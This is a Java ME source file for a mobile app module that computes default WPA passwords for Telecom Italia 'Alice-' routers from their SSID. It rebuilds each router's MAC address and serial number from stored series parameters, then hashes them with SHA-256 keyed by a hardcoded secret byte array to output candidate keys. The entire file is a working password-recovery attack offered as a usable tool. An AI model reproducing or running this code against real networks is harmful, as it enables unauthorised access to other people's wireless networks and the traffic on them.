package gayfi.services;

import javax.microedition.lcdui.TextField;
import java.io.InputStream;
import java.io.DataInputStream;
import java.io.EOFException;
import java.util.Vector;
import gayfi.Service;
import crypt.SHA256;

public class AliceAGPF extends Service
{
  public class Series
  {
    public String sn1, mac1;
    int k, q;

    public Series(String sn1, int k, int q, String mac1) {
      this.sn1 = sn1;
      this.k = k;
      this.q = q;
      this.mac1 = mac1;
    }
  }

  private Series skipLine(InputStream is)
    throws java.io.IOException {
    int c;
    while ((c = is.read()) != -1 && c != 10);
    return null;
  }

  private String readUntil(DataInputStream is, char ch)
    throws java.io.IOException {
    byte c;
    StringBuffer res = new StringBuffer();
    try {
      while (((char) (c = is.readByte())) != ch) {
        if ((char)c == '\n')
          return null;
        res.append((char)c);
      }
    } catch (EOFException e) {
      System.out.println("EOF");
    }
    return res.toString();
  }

  private Series nextLine(DataInputStream is, String ssid)
    throws java.io.IOException {
    if (is.read() != 34)
      return skipLine(is);

    {
      String series = new String();
      char[] tmp = readUntil(is, ',').toCharArray();
      for (int i = 0, x = 0; i < tmp.length; i++)
        if (tmp[i] != 'x' && tmp[i] != 'X') {
          series += String.valueOf(tmp[i]);
          char t = tmp[i];
          tmp[i] = (char) 0;
          tmp[x++] = t;
        }

      if (!ssid.startsWith(series))
        return skipLine(is);
  }

    String sn1 = readUntil(is, ',');
    if (sn1 == null)
      return null;

    int k;

    {
      String tmp = readUntil(is, ',');
      if (tmp == null)
        return null;

      k = Integer.parseInt(tmp);
    }

    int q;

    {
      String tmp = readUntil(is, ',');
      if (tmp == null)
        return null;

      q = Integer.parseInt(tmp);
    }
    String mac1 = readUntil(is, '"');
    skipLine(is);

    if (mac1 == null)
      return null;

    return (new Series(sn1, k, q, mac1));
  }

  public Series[] getSeries(String ssid)
    throws java.io.IOException {
    DataInputStream is = new DataInputStream(getClass().getResourceAsStream("/res/alice-agpf.conf"));
    Series[] series;

    {
      Vector s = new Vector();

      while (is.available() > 0) {
        try {
          Series tmp = nextLine(is, ssid);

          if (tmp != null)
            s.addElement((Object) tmp);
        } catch (java.io.IOException e) {
        }
      }
      series = new Series[s.size()];

      for (int i = 0; i < s.size(); i++) {
        series[i] = (Series) s.elementAt(i);
      }
    }
    is.close();

    return series;
  }

  private boolean checkMac(int[] mac, String ssid) {
    int sum = 0, ssidId = Integer.parseInt(ssid);

    for (int i = 2; i < 6; i++)
      sum |= mac[i] << (24 - ((i - 2) * 8));
    sum &= 0x0fffffff;
    sum %= 100000000;

    return sum == ssidId;
  }

  private int[] generateMac(String ssid, int[] mac, int test) {
    return generateMac(String.valueOf(test) + ssid, mac);
  }

  private int[] generateMac(String ssid, int[] mac) {
    String ssidHex = Integer.toHexString(Integer.parseInt(ssid));
    for (int p = 1, i = 3; i < 6; i++, p += 2) {
      mac[i] = Integer.parseInt(ssidHex.substring(p, p + 2), 16);
    }
    return mac;
  }

  private int[] getMac(String ssid, String mac1) {
    int[] mac = new int[6];
    for (int i = 0, x = 0; i < 6; x++, i += 2) {
      mac[x] = Integer.parseInt(mac1.substring(i, i + 2), 16);
    }

    for (int i = 0; i < 3; i++) {
      int[] newMac = generateMac(ssid, mac, i);
      if (checkMac(newMac, ssid))
        return newMac;
    }

    return null;
  }

  public static byte[] packMac(int[] mac) {
    byte[] res = new byte[6];
    for (int i = 0; i < 6; i++) {
      res[i] = (byte) mac[i];
    }
    return res;
  }

  public static int byteToInt(byte b) {
    int res = 0;

    for (int i = 0; i < 8; i++) {
      res |= b & (1 << (i));
    }

    return res;
  }

  public static String getSerial(String ssid, String sn1, int k, int q) {
    int ssn = Integer.parseInt(ssid);
    String res = Integer.toString((Integer.parseInt(ssid) - q) / k);

    if (res.length() == 7)
      return sn1 + "X" + res;

    char[] pad = new char[7 - res.length()];
    for (int i = 0; i < (7 - res.length()); i++)
      pad[i] = '0';
    return sn1 + "X" + (new String(pad)) + res;
  }

  //public static String padHex(int x) {
    //String res = Integer.toHexString(x);
    //if (res.length() > 1)
      //return res;
    //return "0" + res;
  //}

  protected byte[] ALIS = {100, -58, -35, -29, -27, 121, -74, -39, -122, -106,
    -115, 52, 69, -46, 59, 21, -54, -81, 18, -124, 2, -84, 86, 0, 5, -50, 32,
    117, -111, 63, -36, -24};
  protected String[] CHARSET = {"0", "1", "2", "3", "4", "5", "6", "7", "8",
    "9", "a", "b", "c", "d", "e", "f", "g", "h", "i", "j", "k", "l", "m", "n",
    "o", "p", "q", "r", "s", "t", "u", "v", "w", "x", "y", "z"};

  private TextField essidBox = new TextField("Alice-", null, 8, TextField.ANY);

  public AliceAGPF() {
    main.append("Alice AGPF");
    main.append(essidBox);
  }

  public String calculate() {
    String essid = essidBox.getString().toUpperCase();
    Series[] series;

    try {
      series = getSeries(essid);
    } catch (java.io.IOException e) {
      return "Error while reading file";
    }

    String res = new String();

    for (int i = 0; i < series.length; i++) {
      int[] mac = getMac(essid, series[i].mac1);
      if (mac == null) continue;

      //System.out.println("MAC: " + padHex(mac[0]) + ":" +
          //padHex(mac[1]) + ":" + padHex(mac[2]) + ":" +
          //padHex(mac[3]) + ":" + padHex(mac[4]) + ":" +
          //padHex(mac[5]));
      //System.out.print("K: ");
      //System.out.println(series[i].k);
      //System.out.print("Q: ");
      //System.out.println(series[i].q);
      //System.out.println("SN: " + getSerial(essid, series[i].sn1, series[i].k, series[i].q));

      byte[] digest;
      {
        SHA256 d = new SHA256(ALIS);
        d.update(getSerial(essid, series[i].sn1, series[i].k, series[i].q));
        d.update(packMac(mac));
        digest = d.digest();
      }

      for (int x = 0; x < 24; x++) {
        res += CHARSET[byteToInt(digest[x]) % 36];
      }
      res += "\n";
    }

    return res;
  }
}
